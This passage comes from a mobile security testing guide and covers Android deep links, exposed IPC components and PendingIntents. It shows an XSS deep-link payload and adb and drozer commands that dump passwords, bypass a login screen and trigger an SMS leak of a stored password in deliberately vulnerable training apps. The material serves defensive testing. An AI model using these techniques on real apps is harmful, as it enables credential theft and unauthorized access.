All deep links must be enumerated and verified for correct website association. The actions they perform must be well tested, especially all input data, which should be deemed untrustworthy and thus should always be validated.

None of the input from these sources can be trusted; it must be validated and/or sanitized. Validation ensures processing of data that the app is expecting only. If validation is not enforced, any input can be sent to the app, which may allow an attacker or malicious app to exploit app functionality.

## Static Analysis

### Check for Android OS Version

The Android version in which the app runs also influences the risk of using deep links. Inspect the Android Manifest to check if `minSdkVersion` is 31 or higher.

- Before Android 12 (API level 31), if the app has any [non-verifiable deep links](https://developer.android.com/training/app-links/verify-android-applinks#fix-errors), it can cause the system to not verify all Android App Links for that app.
- Starting on Android 12 (API level 31), apps benefit from a [reduced attack surface](https://developer.android.com/training/app-links/deep-linking). A generic web intent resolves to the user's default browser app unless the target app is approved for the specific domain contained in that web intent.

### Check for Deep Link Usage

**Inspecting the Android Manifest:**

You can easily determine whether deep links (with or without custom URL schemes) are defined by @MASTG-TECH-0007 and inspecting the Android Manifest file looking for [`<intent-filter>` elements](https://developer.android.com/guide/components/intents-filters.html#DataTest "intent-filters - DataTest").

- **Custom Url Schemes**: The following example specifies a deep link with a custom URL scheme called `myapp://`.

  ```xml
  <activity android:name=".MyUriActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="myapp" android:host="path" />
    </intent-filter>
  </activity>
  ```

- **Deep Links**: The following example specifies a deep Link using both the `http://` and `https://` schemes, along with the host and path that will activate it (in this case, the full URL would be `https://www.myapp.com/my/app/path`):

  ```xml
  <intent-filter>
    ...
    <data android:scheme="http" android:host="www.myapp.com" android:path="/my/app/path" />
    <data android:scheme="https" android:host="www.myapp.com" android:path="/my/app/path" />
  </intent-filter>
  ```

- **App Links**: If the `<intent-filter>` includes the flag `android:autoVerify="true"`, this causes the Android system to reach out to the declared `android:host` in an attempt to access the [Digital Asset Links file](https://developers.google.com/digital-asset-links/v1/getting-started "Digital Asset Link") in order to [verify the App Links](https://developer.android.com/training/app-links/verify-android-applinks "Verify Android App Links"). **A deep link can be considered an App Link only if the verification is successful.**

  ```xml
  <intent-filter android:autoVerify="true">
  ```

When listing deep links remember that `<data>` elements within the same `<intent-filter>` are actually merged together to account for all variations of their combined attributes.

```xml
<intent-filter>
  ...
  <data android:scheme="https" android:host="www.example.com" />
  <data android:scheme="app" android:host="open.my.app" />
</intent-filter>
```

It might seem as though this supports only `https://www.example.com` and `app://open.my.app`. However, it actually supports:

- `https://www.example.com`
- `app://open.my.app`
- `app://www.example.com`
- `https://open.my.app`

**Using Dumpsys:**

Use @MASTG-TOOL-0004 to run the following command that will show all schemes:

```bash
adb shell dumpsys package com.example.package
```

**Using Android "App Link Verification" Tester:**

Use the [Android "App Link Verification" Tester](https://github.com/inesmartins/Android-App-Link-Verification-Tester) script to list all deep links (`list-all`) or only app links (`list-applinks`):

```bash
python3 deeplink_analyser.py -op list-all -apk ~/Downloads/example.apk

.MainActivity

app://open.my.app
app://www.example.com
https://open.my.app
https://www.example.com
```

### Check for Correct Website Association

Even if deep links contain the `android:autoVerify="true"` attribute, they must be _actually_ verified in order to be considered App Links. You should test for any possible misconfigurations that might prevent full verification.

#### Automatic Verification

Use the [Android "App Link Verification" Tester](https://github.com/inesmartins/Android-App-Link-Verification-Tester) script to get the verification status for all app links (`verify-applinks`). See an example [in the tool's README](https://github.com/inesmartins/Android-App-Link-Verification-Tester#use-an-apk-to-check-for-dals-for-all-app-links).

**Only on Android 12 (API level 31) or higher:**

You can use @MASTG-TOOL-0004 to test the verification logic regardless of whether the app targets Android 12 (API level 31) or not. This feature allows you to:

- [invoke the verification process manually](https://developer.android.com/training/app-links/verify-android-applinks#support-updated-domain-verification).
- [reset the state of the target app's Android App Links on your device](https://developer.android.com/training/app-links/verify-android-applinks#reset-state).
- [invoke the domain verification process](https://developer.android.com/training/app-links/verify-android-applinks#invoke-domain-verification).

You can also [review the verification results](https://developer.android.com/training/app-links/verify-android-applinks#review-results). For example:

```bash
adb shell pm get-app-links com.example.package

com.example.package:
    ID: 01234567-89ab-cdef-0123-456789abcdef
    Signatures: [***]
    Domain verification state:
      example.com: verified
      sub.example.com: legacy_failure
      example.net: verified
      example.org: 1026
```

> The same information can be found by running `adb shell dumpsys package com.example.package` (only on Android 12 (API level 31) or higher).

#### Manual Verification

This section details a few, of potentially many, reasons why the verification process failed or was not actually triggered. See more information in the [Android Developers Documentation](https://developer.android.com/training/app-links/verify-android-applinks#fix-errors) and in the white paper ["Measuring the Insecurity of Mobile Deep Links of Android"](https://people.cs.vt.edu/gangwang/deep17.pdf).

**Check the [Digital Asset Links file](https://developers.google.com/digital-asset-links/v1/getting-started "Digital Asset Link"):**

- Check for **missing** Digital Asset Links file:
    - try to find it in the domain's `/.well-known/` path. Example: `https://www.example.com/.well-known/assetlinks.json`
    - or try `https://digitalassetlinks.googleapis.com/v1/statements:list?source.web.site=www.example.com`
- Check for valid Digital Asset Links file **served via HTTP**.
- Check for **invalid** Digital Asset Links files served via HTTPS. For example:
    - the file contains invalid JSON.
    - the file doesn't include the target app's package.

**Check for Redirects:**

To enhance the app security, the system [doesn't verify any Android App Links](https://developer.android.com/training/app-links/verify-android-applinks#fix-errors) for an app if the server sets a redirect such as `http://example.com` to `https://example.com` or `example.com` to `www.example.com`.

**Check for Subdomains:**

If an intent filter lists multiple hosts with different subdomains, there must be a valid Digital Asset Links file on each domain. For example, the following intent filter includes `www.example.com` and `mobile.example.com` as accepted intent URL hosts.

```xml
<application>
  <activity android:name=”MainActivity”>
    <intent-filter android:autoVerify="true">
      <action android:name="android.intent.action.VIEW" />
      <category android:name="android.intent.category.DEFAULT" />
      <category android:name="android.intent.category.BROWSABLE" />
      <data android:scheme="https" />
      <data android:scheme="https" />
      <data android:host="www.example.com" />
      <data android:host="mobile.example.com" />
    </intent-filter>
  </activity>
</application>
```

In order for the deep links to correctly register, a valid Digital Asset Links file must be published at both `https://www.example.com/.well-known/assetlinks.json` and `https://mobile.example.com/.well-known/assetlinks.json`.

**Check for Wildcards:**

If the hostname includes a wildcard (such as `*.example.com`), you should be able to find a valid Digital Asset Links file at the root hostname: `https://example.com/.well-known/assetlinks.json`.

### Check the Handler Method

Even if the deep link is correctly verified, the logic of the handler method should be carefully analyzed. Pay special attention to **deep links being used to transmit data** (which is controlled externally by the user or any other app).

First, obtain the name of the Activity from the Android Manifest `<activity>` element which defines the target `<intent-filter>` and search for usage of [`getIntent`](https://developer.android.com/reference/android/content/Intent#getIntent(java.lang.String) "getIntent()") and [`getData`](https://developer.android.com/reference/android/content/Intent#getData%28%29 "getData()"). This general approach of locating these methods can be used across most applications when performing reverse engineering and is key when trying to understand how the application uses deep links and handles any externally provided input data and if it could be subject to any kind of abuse.

The following example is a snippet from an example Kotlin app decompiled with @MASTG-TOOL-0018. From the [static analysis](#check-for-deep-link-usage) we know that it supports the deep link `deeplinkdemo://load.html/` as part of `com.mstg.deeplinkdemo.WebViewActivity`.

```java
// snippet edited for simplicity
public final class WebViewActivity extends AppCompatActivity {
    private ActivityWebViewBinding binding;

    public void onCreate(Bundle savedInstanceState) {
        Uri data = getIntent().getData();
        String html = data == null ? null : data.getQueryParameter("html");
        Uri data2 = getIntent().getData();
        String deeplink_url = data2 == null ? null : data2.getQueryParameter("url");
        View findViewById = findViewById(R.id.webView);
        if (findViewById != null) {
            WebView wv = (WebView) findViewById;
            wv.getSettings().setJavaScriptEnabled(true);
            if (deeplink_url != null) {
                wv.loadUrl(deeplink_url);
            ...
```

You can simply follow the `deeplink_url` String variable and see the result from the `wv.loadUrl` call. This means the attacker has full control of the URL being loaded to the WebView (as shown above has @MASTG-TEST-0031.

The same WebView might be also rendering an attacker controlled parameter. In that case, the following deep link payload would trigger [Reflected Cross-Site Scripting (XSS)](../../../Document/0x04h-Testing-Code-Quality.md#cross-site-scripting-flaws) within the context of the WebView:

```default
deeplinkdemo://load.html?attacker_controlled=<svg onload=alert(1)>
```

But there are many other possibilities. Be sure to check the following sections to learn more about what to expect and how to test different scenarios:

- ["Cross-Site Scripting Flaws"](../../../Document/0x04h-Testing-Code-Quality.md#cross-site-scripting-flaws).
- ["Injection Flaws"](../../../Document/0x04h-Testing-Code-Quality.md#injection-flaws).
- @MASTG-TEST-0034.
- @MASTG-TEST-0027
- @MASTG-TEST-0031
- @MASTG-TEST-0032

In addition, we recommend to search and read public reports (search term: `"deep link*"|"deeplink*" site:https://hackerone.com/reports/`). For example:

- ["[HackerOne#1372667] Able to steal bearer token from deep link"](https://hackerone.com/reports/1372667)
- ["[HackerOne#401793] Insecure deeplink leads to sensitive information disclosure"](https://hackerone.com/reports/401793)
- ["[HackerOne#583987] Android app deeplink leads to CSRF in follow action"](https://hackerone.com/reports/583987)
- ["[HackerOne#637194] Bypass of biometrics security functionality is possible in Android application"](https://hackerone.com/reports/637194)
- ["[HackerOne#341908] XSS via Direct Message deeplinks"](https://hackerone.com/reports/341908)

## Dynamic Analysis

Here you will use the list of deep links from the static analysis to iterate and determine each handler method and the processed data, if any. You will first start a @MASTG-TOOL-0031 hook and then begin invoking the deep links.

The following example assumes a target app that accepts this deep link: `deeplinkdemo://load.html`. However, we don't know the corresponding handler method yet, nor the parameters it potentially accepts.

**[Step 1] Frida Hooking:**

You can use the script ["Android Deep Link Observer"](https://codeshare.frida.re/@leolashkevych/android-deep-link-observer/) from @MASTG-TOOL-0032 to monitor all invoked deep links triggering a call to `Intent.getData`. You can also use the script as a base to include your own modifications depending on the use case at hand. In this case we [included the stack trace](https://github.com/FrenchYeti/frida-trick/blob/master/README.md) in the script since we are interested in the method which calls `Intent.getData`.

**[Step 2] Invoking Deep Links:**

Now you can invoke any of the deep links using @MASTG-TOOL-0004 and the [Activity Manager (am)](https://developer.android.com/training/app-links/deep-linking#testing-filters "Activity Manager") which will send intents within the Android device. For example:

```bash
adb shell am start -W -a android.intent.action.VIEW -d "deeplinkdemo://load.html/?message=ok#part1"

Starting: Intent { act=android.intent.action.VIEW dat=deeplinkdemo://load.html/?message=ok }
Status: ok
LaunchState: WARM
Activity: com.mstg.deeplinkdemo/.WebViewActivity
TotalTime: 210
WaitTime: 217
Complete
```

> This might trigger the disambiguation dialog when using the "http/https" schema or if other installed apps support the same custom URL schema. You can include the package name to make it an explicit intent.

This invocation will log the following:

```bash
[*] Intent.getData() was called
[*] Activity: com.mstg.deeplinkdemo.WebViewActivity
[*] Action: android.intent.action.VIEW

[*] Data
- Scheme: deeplinkdemo://
- Host: /load.html
- Params: message=ok
- Fragment: part1

[*] Stacktrace:

android.content.Intent.getData(Intent.java)
com.mstg.deeplinkdemo.WebViewActivity.onCreate(WebViewActivity.kt)
android.app.Activity.performCreate(Activity.java)
...
com.android.internal.os.ZygoteInit.main(ZygoteInit.java)
```

In this case we've crafted the deep link including arbitrary parameters (`?message=ok`) and fragment (`#part1`). We still don't know if they are being used. The information above reveals useful information that you can use now to reverse engineer the app. See the section ["Check the Handler Method"](#check-the-handler-method) to learn about things you should consider.

- File: `WebViewActivity.kt`
- Class: `com.mstg.deeplinkdemo.WebViewActivity`
- Method: `onCreate`

> Sometimes you can even take advantage of other applications that you know interact with your target app. You can reverse engineer the app, (e.g. to extract all strings and filter those which include the target deep links, `deeplinkdemo:///load.html` in the previous case), or use them as triggers, while hooking the app as previously discussed.
## Testing for Sensitive Functionality Exposure Through IPC

## Overview

To test for [sensitive functionality exposure through IPC](../../../Document/0x05h-Testing-Platform-Interaction.md#sensitive-functionality-exposure-through-ipc "Sensitive Functionality Exposure Through IPC") mechanisms you should first enumerate all the IPC mechanisms the app uses and then try to identify whether sensitive data is leaked when the mechanisms are used.

## Static Analysis

We start by looking at the AndroidManifest.xml, where all activities, services, and content providers included in the app must be declared (otherwise the system won't recognize them and they won't run).

- [`<intent-filter>`](https://developer.android.com/guide/topics/manifest/intent-filter-element.html "IntentFilterElement")
- [`<service>`](https://developer.android.com/guide/topics/manifest/service-element.html "ServiceElement")
- [`<provider>`](https://developer.android.com/guide/topics/manifest/provider-element.html "ProviderElement")
- [`<receiver>`](https://developer.android.com/guide/topics/manifest/receiver-element.html "ReceiverElement")

An "exported" activity, service, or content can be accessed by other apps. There are two common ways to designate a component as exported. The obvious one is setting the export tag to true `android:exported="true"`. The second way involves defining an `<intent-filter>` within the component element (`<activity>`, `<service>`, `<receiver>`). When this is done, the export tag is automatically set to "true". To prevent all other Android apps from interacting with the IPC component element, be sure that the `android:exported="true"` value and an `<intent-filter>` aren't in their `AndroidManifest.xml` files unless this is necessary.

Remember that using the permission tag (`android:permission`) will also limit other applications' access to a component. If your IPC is intended to be accessible to other applications, you can apply a security policy with the `<permission>` element and set a proper `android:protectionLevel`. When `android:permission` is used in a service declaration, other applications must declare a corresponding `<uses-permission>` element in their own manifest to start, stop, or bind to the service.

For more information about the content providers, please refer to the test case "Testing Whether Stored Sensitive Data Is Exposed via IPC Mechanisms" in chapter "Testing Data Storage".

Once you identify a list of IPC mechanisms, review the source code to see whether sensitive data is leaked when the mechanisms are used. For example, content providers can be used to access database information, and services can be probed to see if they return data. Broadcast receivers can leak sensitive information if probed or sniffed.

In the following, we use two example apps and give examples of identifying vulnerable IPC components:

- ["Sieve"](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk "Sieve: Vulnerable Password Manager")
- @MASTG-APP-0010

### Activities

#### Inspect the AndroidManifest

In the "Sieve" app, we find three exported activities, identified by `<activity>`:

```xml
<activity android:excludeFromRecents="true" android:label="@string/app_name" android:launchMode="singleTask" android:name=".MainLoginActivity" android:windowSoftInputMode="adjustResize|stateVisible">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
<activity android:clearTaskOnLaunch="true" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="true" android:label="@string/title_activity_file_select" android:name=".FileSelectActivity" />
<activity android:clearTaskOnLaunch="true" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="true" android:label="@string/title_activity_pwlist" android:name=".PWList" />

```

#### Inspect the Source Code

By inspecting the `PWList.java` activity, we see that it offers options to list all keys, add, delete, etc. If we invoke it directly, we will be able to bypass the LoginActivity. More on this can be found in the dynamic analysis below.

### Services

#### Inspect the AndroidManifest

In the "Sieve" app, we find two exported services, identified by `<service>`:

```xml
<service android:exported="true" android:name=".AuthService" android:process=":remote" />
<service android:exported="true" android:name=".CryptoService" android:process=":remote" />
```

#### Inspect the Source Code

Check the source code for the class `android.app.Service`:

By reversing the target application, we can see that the service `AuthService` provides functionality for changing the password and PIN-protecting the target app.

```java
   public void handleMessage(Message msg) {
            AuthService.this.responseHandler = msg.replyTo;
            Bundle returnBundle = msg.obj;
            int responseCode;
            int returnVal;
            switch (msg.what) {
                ...
                case AuthService.MSG_SET /*6345*/:
                    if (msg.arg1 == AuthService.TYPE_KEY) /*7452*/ {
                        responseCode = 42;
                        if (AuthService.this.setKey(returnBundle.getString("com.mwr.example.sieve.PASSWORD"))) {
                            returnVal = 0;
                        } else {
                            returnVal = 1;
                        }
                    } else if (msg.arg1 == AuthService.TYPE_PIN) {
                        responseCode = 41;
                        if (AuthService.this.setPin(returnBundle.getString("com.mwr.example.sieve.PIN"))) {
                            returnVal = 0;
                        } else {
                            returnVal = 1;
                        }
                    } else {
                        sendUnrecognisedMessage();
                        return;
                    }
           }
   }
```

### Broadcast Receivers

#### Inspect the AndroidManifest

In the "Android Insecure Bank" app, we find a broadcast receiver in the manifest, identified by `<receiver>`:

```xml
<receiver android:exported="true" android:name="com.android.insecurebankv2.MyBroadCastReceiver">
    <intent-filter>
        <action android:name="theBroadcast" />
    </intent-filter>
</receiver>
```

#### Inspect the Source Code

Search the source code for strings like `sendBroadcast`, `sendOrderedBroadcast`, and `sendStickyBroadcast`. Make sure that the application doesn't send any sensitive data.

If an Intent is broadcasted and received within the application only, `LocalBroadcastManager` can be used to prevent other apps from receiving the broadcast message. This reduces the risk of leaking sensitive information.

To understand more about what the receiver is intended to do, we have to go deeper in our static analysis and search for usage of the class `android.content.BroadcastReceiver` and the `Context.registerReceiver` method, which is used to dynamically create receivers.

The following extract of the target application's source code shows that the broadcast receiver triggers transmission of an SMS message containing the user's decrypted password.

```java
public class MyBroadCastReceiver extends BroadcastReceiver {
  String usernameBase64ByteString;
  public static final String MYPREFS = "mySharedPreferences";

  @Override
  public void onReceive(Context context, Intent intent) {
    // TODO Auto-generated method stub

        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");

    if (phn != null) {
      try {
                SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);
                final String username = settings.getString("EncryptedUsername", null);
                byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);
                usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
                final String password = settings.getString("superSecurePassword", null);
                CryptoClass crypt = new CryptoClass();
                String decryptedPassword = crypt.aesDeccryptedString(password);
                String textPhoneno = phn.toString();
                String textMessage = "Updated Password from: "+decryptedPassword+" to: "+newpass;
                SmsManager smsManager = SmsManager.getDefault();
                System.out.println("For the changepassword - phonenumber: "+textPhoneno+" password is: "+textMessage);
smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
          }
     }
  }
}
```

BroadcastReceivers should use the `android:permission` attribute; otherwise, other applications can invoke them. You can use `Context.sendBroadcast(intent, receiverPermission);` to specify permissions a receiver must have to [read the broadcast](https://developer.android.com/reference/android/content/Context#sendBroadcast%28android.content.Intent,%20java.lang.String%29 "SendBroadcast"). You can also set an explicit application package name that limits the components this Intent will resolve to. If left as the default value (null), all components in all applications will be considered. If non-null, the Intent can match only the components in the given application package.

## Dynamic Analysis

You can enumerate IPC components with @MASTG-TOOL-0035. To list all exported IPC components, upload the APK file and the components collection will be displayed in the following screen:

<img src="Images/Chapters/0x05h/MobSF_Show_Components.png" width="100%" />

### Content Providers

The "Sieve" application implements a vulnerable content provider. To list the content providers exported by the Sieve app, execute the following command:

```bash
$ adb shell dumpsys package com.mwr.example.sieve | grep -Po "Provider{[\w\d\s\./]+}" | sort -u
Provider{34a20d5 com.mwr.example.sieve/.FileBackupProvider}
Provider{64f10ea com.mwr.example.sieve/.DBContentProvider}
```

Once identified, you can use @MASTG-TOOL-0018 to reverse engineer the app and analyze the source code of the exported content providers to identify potential vulnerabilities.

To identify the corresponding class of a content provider, use the following information:

- Package Name: `com.mwr.example.sieve`.
- Content Provider Class Name: `DBContentProvider`.

When analyzing the class `com.mwr.example.sieve.DBContentProvider`, you'll see that it contains several URIs:

```java
package com.mwr.example.sieve;
...
public class DBContentProvider extends ContentProvider {
    public static final Uri KEYS_URI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys");
    public static final Uri PASSWORDS_URI = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
...
}
```

Use the following commands to call the content provider using the identified URIs:

```bash
$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/
Row: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234

$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/
Row: 0 _id=1, service=test, username=test, password=BLOB, email=t@tedt.com
Row: 1 _id=2, service=bank, username=owasp, password=BLOB, email=user@tedt.com

$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection email:username:password --where 'service=\"bank\"'
Row: 0 email=user@tedt.com, username=owasp, password=BLOB
```

You are able now to retrieve all database entries (see all lines starting with "Row:" in the output).

### Activities

To list activities exported by an application, you can use the following command and focus on `activity` elements:

```bash
$ aapt d xmltree sieve.apk AndroidManifest.xml
...
E: activity (line=32)
  A: android:label(0x01010001)=@0x7f05000f
  A: android:name(0x01010003)=".FileSelectActivity" (Raw: ".FileSelectActivity")
  A: android:exported(0x01010010)=(type 0x12)0xffffffff
  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff
  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff
  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff
E: activity (line=40)
  A: android:label(0x01010001)=@0x7f050000
  A: android:name(0x01010003)=".MainLoginActivity" (Raw: ".MainLoginActivity")
  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff
  A: android:launchMode(0x0101001d)=(type 0x10)0x2
  A: android:windowSoftInputMode(0x0101022b)=(type 0x11)0x14
  E: intent-filter (line=46)
    E: action (line=47)
      A: android:name(0x01010003)="android.intent.action.MAIN" (Raw: "android.intent.action.MAIN")
    E: category (line=49)
      A: android:name(0x01010003)="android.intent.category.LAUNCHER" (Raw: "android.intent.category.LAUNCHER")
E: activity (line=52)
  A: android:label(0x01010001)=@0x7f050009
  A: android:name(0x01010003)=".PWList" (Raw: ".PWList")
  A: android:exported(0x01010010)=(type 0x12)0xffffffff
  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff
  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff
  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff
E: activity (line=60)
  A: android:label(0x01010001)=@0x7f05000a
  A: android:name(0x01010003)=".SettingsActivity" (Raw: ".SettingsActivity")
  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff
  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff
  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff
...
```

You can identify an exported activity using one of the following properties:

- It have an `intent-filter` sub declaration.
- It have the attribute `android:exported` to `0xffffffff`.

You can also use @MASTG-TOOL-0018 to identify exported activities in the file `AndroidManifest.xml` using the criteria described above:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.mwr.example.sieve">
...
  <!-- This activity is exported via the attribute "exported" -->
  <activity android:name=".FileSelectActivity" android:exported="true" />
   <!-- This activity is exported via the "intent-filter" declaration  -->
  <activity android:name=".MainLoginActivity">
    <intent-filter>
      <action android:name="android.intent.action.MAIN"/>
      <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
  </activity>
  <!-- This activity is exported via the attribute "exported" -->
  <activity android:name=".PWList" android:exported="true" />
  <!-- Activities below are not exported -->
  <activity android:name=".SettingsActivity" />
  <activity android:name=".AddEntryActivity"/>
  <activity android:name=".ShortLoginActivity" />
  <activity android:name=".WelcomeActivity" />
  <activity android:name=".PINActivity" />
...
</manifest>
```

Enumerating activities in the vulnerable password manager "Sieve" shows that the following activities are exported:

- `.MainLoginActivity`
- `.PWList`
- `.FileSelectActivity`

Use the command below to launch an activity:

```bash
# Start the activity without specifying an action or an category
$ adb shell am start -n com.mwr.example.sieve/.PWList
Starting: Intent { cmp=com.mwr.example.sieve/.PWList }

# Start the activity indicating an action (-a) and an category (-c)
$ adb shell am start -n "com.mwr.example.sieve/.MainLoginActivity" -a android.intent.action.MAIN -c android.intent.category.LAUNCHER
Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.mwr.example.sieve/.MainLoginActivity }
```

Since the activity `.PWList` is called directly in this example, you can use it to bypass the login form protecting the password manager, and access the data contained within the password manager.

### Services

Services can be enumerated with the Drozer module `app.service.info`:

```bash
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null
```

To communicate with a service, you must first use static analysis to identify the required inputs.

Because this service is exported, you can use the module `app.service.send` to communicate with the service and change the password stored in the target application:

```bash
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
  what: 4
  arg1: 42
  arg2: 0
  Empty
```

### Broadcast Receivers

To list broadcast receivers exported by an application, you can use the following command and focus on `receiver` elements:

```bash
$ aapt d xmltree InsecureBankv2.apk AndroidManifest.xml
...
E: receiver (line=88)
  A: android:name(0x01010003)="com.android.insecurebankv2.MyBroadCastReceiver" (Raw: "com.android.insecurebankv2.MyBroadCastReceiver")
  A: android:exported(0x01010010)=(type 0x12)0xffffffff
  E: intent-filter (line=91)
    E: action (line=92)
      A: android:name(0x01010003)="theBroadcast" (Raw: "theBroadcast")
E: receiver (line=119)
  A: android:name(0x01010003)="com.google.android.gms.wallet.EnableWalletOptimizationReceiver" (Raw: "com.google.android.gms.wallet.EnableWalletOptimizationReceiver")
  A: android:exported(0x01010010)=(type 0x12)0x0
  E: intent-filter (line=122)
    E: action (line=123)
      A: android:name(0x01010003)="com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION" (Raw: "com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION")
...
```

You can identify an exported broadcast receiver using one of the following properties:

- It has an `intent-filter` sub declaration.
- It has the attribute `android:exported` set to `0xffffffff`.

You can also use @MASTG-TOOL-0018 to identify exported broadcast receivers in the file `AndroidManifest.xml` using the criteria described above:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.insecurebankv2">
...
  <!-- This broadcast receiver is exported via the attribute "exported" as well as the "intent-filter" declaration -->
  <receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
    <intent-filter>
      <action android:name="theBroadcast"/>
    </intent-filter>
  </receiver>
  <!-- This broadcast receiver is NOT exported because the attribute "exported" is explicitly set to false -->
  <receiver android:name="com.google.android.gms.wallet.EnableWalletOptimizationReceiver" android:exported="false">
    <intent-filter>
      <action android:name="com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION"/>
    </intent-filter>
  </receiver>
...
</manifest>
```

The above example from the vulnerable banking application @MASTG-APP-0010 shows that only the broadcast receiver named `com.android.insecurebankv2.MyBroadCastReceiver` is exported.

Now that you know that there is an exported broadcast receiver, you can dive deeper and reverse engineer the app using @MASTG-TOOL-0018. This will allow you to analyze the source code searching for potential vulnerabilities that you could later try to exploit. The source code of the exported broadcast receiver is the following:

```java
package com.android.insecurebankv2;
...
public class MyBroadCastReceiver extends BroadcastReceiver {
    public static final String MYPREFS = "mySharedPreferences";
    String usernameBase64ByteString;

    public void onReceive(Context context, Intent intent) {
        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");
        if (phn != null) {
            try {
                SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);
                this.usernameBase64ByteString = new String(Base64.decode(settings.getString("EncryptedUsername", (String) null), 0), "UTF-8");
                String decryptedPassword = new CryptoClass().aesDeccryptedString(settings.getString("superSecurePassword", (String) null));
                String textPhoneno = phn.toString();
                String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
                SmsManager smsManager = SmsManager.getDefault();
                System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);
                smsManager.sendTextMessage(textPhoneno, (String) null, textMessage, (PendingIntent) null, (PendingIntent) null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Phone number is null");
        }
    }
}
```

As you can see in the source code, this broadcast receiver expects two parameters named `phonenumber` and `newpass`. With this information you can now try to exploit this broadcast receiver by sending events to it using custom values:

```bash
# Send an event with the following properties:
# Action is set to "theBroadcast"
# Parameter "phonenumber" is set to the string "07123456789"
# Parameter "newpass" is set to the string "12345"
$ adb shell am broadcast -a theBroadcast --es phonenumber "07123456789" --es newpass "12345"
Broadcasting: Intent { act=theBroadcast flg=0x400000 (has extras) }
Broadcast completed: result=0
```

This generates the following SMS:

```bash
Updated Password from: SecretPassword@ to: 12345
```

#### Sniffing Intents

If an Android application broadcasts intents without setting a required permission or specifying the destination package, the intents can be monitored by any application that runs on the device.

To register a broadcast receiver to sniff intents, use the Drozer module `app.broadcast.sniff` and specify the action to monitor with the `--action` parameter:

```bash
dz> run app.broadcast.sniff  --action theBroadcast
[*] Broadcast receiver registered to sniff matching intents
[*] Output is updated once a second. Press Control+C to exit.

Action: theBroadcast
Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
Extra: phonenumber=07123456789 (java.lang.String)
Extra: newpass=12345 (java.lang.String)`
```

You can also use the following command to sniff the intents. However, the content of the extras passed will not be displayed:

```bash
$ adb shell dumpsys activity broadcasts | grep "theBroadcast"
BroadcastRecord{fc2f46f u0 theBroadcast} to user 0
Intent { act=theBroadcast flg=0x400010 (has extras) }
BroadcastRecord{7d4f24d u0 theBroadcast} to user 0
Intent { act=theBroadcast flg=0x400010 (has extras) }
45: act=theBroadcast flg=0x400010 (has extras)
46: act=theBroadcast flg=0x400010 (has extras)
121: act=theBroadcast flg=0x400010 (has extras)
144: act=theBroadcast flg=0x400010 (has extras)
```
## Testing for Vulnerable Implementation of PendingIntent

## Overview

When testing [Pending Intents](../../../Document/0x05h-Testing-Platform-Interaction.md#pending-intents) you must ensure that they are immutable and that the app explicitly specifies the exact package, action, and component that will receive the base intent.

## Static Analysis

To identify vulnerable implementations, static analysis can be performed by looking for API calls used for obtaining a `PendingIntent`. Such APIs are listed below:

```java
PendingIntent getActivity(Context, int, Intent, int)
PendingIntent getActivity(Context, int, Intent, int, Bundle)
PendingIntent getActivities(Context, int, Intent, int, Bundle)
PendingIntent getActivities(Context, int, Intent, int)
PendingIntent getForegroundService(Context, int, Intent, int)
PendingIntent getService(Context, int, Intent, int)
```

Once any of the above function is spotted, check the implementation of the base intent and the `PendingIntent` for the security pitfalls listed in the [Pending Intents](../../../Document/0x05h-Testing-Platform-Interaction.md#pending-intents) section.

